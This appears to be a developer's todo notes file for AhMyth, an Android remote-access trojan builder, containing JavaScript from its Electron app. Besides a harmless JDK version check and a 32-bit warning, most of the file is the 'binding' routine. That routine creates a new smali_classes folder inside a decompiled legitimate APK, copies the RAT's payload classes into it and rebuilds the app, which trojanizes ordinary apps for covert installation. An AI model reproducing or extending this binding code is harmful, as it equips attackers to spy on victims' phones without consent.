## Todo 06: function to check the users JDK Version using *child_process*
> If this works the way I need it to, then it will stop any building or binding process if the users JDK version is not 11.x.
>> The function should only consider the major version number *11*.
```js
const { exec } = require('child_process');

function checkJavaVersion(callback) {
  exec('java -version', (error, stdout, stderr) => {
    if (error) {
      callback(new Error('Java is not installed or not accessible.'));
    } else {
      const versionOutput = stderr || stdout;
      const versionMatch = versionOutput.match(/version "(\d+)\.(\d+)\.|version "(\d+)\-internal"/);
      if (versionMatch) {
        const majorVersion = parseInt(versionMatch[1] || versionMatch[3], 10);
        if (majorVersion === 11) {
          callback(null, majorVersion);
        } else {
          callback(new Error('JDK Version is not 11.x, Aborting!'));
        }
      } else {
        callback(new Error('Java is not installed or not accessible.'));
      }
    }
  });
}

// Usage example:
checkJavaVersion((error, javaVersion) => {
  if (error) {
    delayedLog(error.message);
    // Abort processes here
  } else {
    // Continue with processes here, since Java version is 11
  }
});
```
<br></br>
## Todo 07: 32bit arch deprecation warning
> I'm sad to have to implement this, but unfortunately theres nothing i can do about it.
```js
const architecture = process.arch;
if (architecture === 'ia32') {
    delayedLog('Warning: AhMyth will be deprecated for all 32bit architectures when Apktool reaches v3.0.0 in the future.', CONSTANTS.logStatus.WARNING);
}
```
<br></br>
## Todo 05 + Todo 08: `createPayloadDirectory` function
> This function wrap also fixes the MAJOR binding bug currently present in *Beta.5*
```js
$appCtrl.createPayloadDirectory = (files) => {
    var ignoreDirs = ['original',
        'res',
        'build',
        'kotlin',
        'lib',
        'assets',
        'META-INF',
        'unknown',
        'smali_assets'];
    var smaliList = files.filter((item) => item.isDirectory() && !(ignoreDirs.includes(item.name))).map((item) => item.name);
    var collator = new Intl.Collator([], {
        numeric: true
    });
    smaliList.sort((a, b) => collator.compare(a, b));
    var lastSmali = smaliList[smaliList.length - 1];

    if (lastSmali == "smali") {
        payloadSmaliFolder = '/smali_classes2';
        return payloadSmaliFolder;
    } else {
        var extractSmaliNumber = lastSmali.match(/[a-zA-Z_]+|[0-9]+/g);
        var lastSmaliNumber = parseInt(extractSmaliNumber[1]);
        var newSmaliNumber = lastSmaliNumber + 1;
        var payloadSmaliFolder = '/smali_classes' + newSmaliNumber;
        return payloadSmaliFolder;
    }
};

$appCtrl.copyAhmythFilesAndGenerateApk = (apkFolder) => {

    delayedLog('[★] Reading the Decompiled Original Application...')
    fs.readdir(apkFolder, {
        withFileTypes: true
    }, (error, files) => {
        if (error) {
            delayedLog('[x] Failed to Read the Decompiled Original Application!', CONSTANTS.logStatus.FAIL);
            WriteErrorLog(error, 'Reading.log');
            delayedLog('[¡] Error written to "Reading.log" on... ', CONSTANTS.logStatus.INFO);
            delayedLog(logPath, CONSTANTS.logStatus.INFO);
            return;
        }

        const payloadSmaliFolder = $appCtrl.createPayloadDirectory(files);
        const targetPayloadFolder = dir.join(apkFolder, payloadSmaliFolder);

        delayedLog(`[★] Creating the ${payloadSmaliFolder} Directory...`);
        fs.mkdir(targetPayloadFolder, {
            recursive: true
        }, (error) => {
            if (error) {
                delayedLog(`[x] Unable to Create the ${payloadSmaliFolder} Directory!`, CONSTANTS.logStatus.FAIL);
                return;
            }

            delayedLog(`[★] Copying Payload Files to the ${payloadSmaliFolder} Directory...`);
            fs.copy(dir.join(CONSTANTS.ahmythApkFolderPath, "smali"), targetPayloadFolder, {
                overwrite: true
            }, (error) => {
                if (error) {
                    delayedLog('[x] Copying Failed!', CONSTANTS.logStatus.FAIL);
                    WriteErrorLog(error, 'Copying');
                    delayedLog('[¡] Error written to "Copying.log" on...', CONSTANTS.logStatus.INFO);
                    delayedLog(logPath, CONSTANTS.logStatus.INFO);
                    return;
                }

                // Copy android directory to the smali folder in the apkFolder
                fs.copy(dir.join(targetPayloadFolder, 'android'), dir.join(apkFolder, 'smali', 'android'), {
                    overwrite: true
                }, (error) => {
                    if (error) {
                        delayedLog('[x] Copying "android" directory failed!', CONSTANTS.logStatus.FAIL);
                        WriteErrorLog(error, 'Copying "android" directory');
                        delayedLog('[¡] Error written to "Copying.log" on...', CONSTANTS.logStatus.INFO);
                        delayedLog(logPath, CONSTANTS.logStatus.INFO);
                        return;
                    }

                    // Copy androidx directory to the smali folder in the apkFolder
                    fs.copy(dir.join(targetPayloadFolder, 'androidx'), dir.join(apkFolder, 'smali', 'androidx'), {
                        overwrite: true
                    }, (error) => {
                        if (error) {
                            delayedLog('[x] Copying "androidx" directory failed!', CONSTANTS.logStatus.FAIL);
                            WriteErrorLog(error, 'Copying "androidx" directory');
                            delayedLog('[¡] Error written to "Copying.log" on...', CONSTANTS.logStatus.INFO);
                            delayedLog(logPath, CONSTANTS.logStatus.INFO);
                            return;
                        }

                        // Remove the original 'android' and 'androidx' directories
                        fs.rmSync(dir.join(targetPayloadFolder, 'android'), {
                            recursive: true
                        });
                        fs.rmSync(dir.join(targetPayloadFolder, 'androidx'), {
                            recursive: true
                        });

                        // Continue with Apk generation
                        $appCtrl.GenerateApk(apkFolder);
                    });
                });
            });
        });
    });
}
```
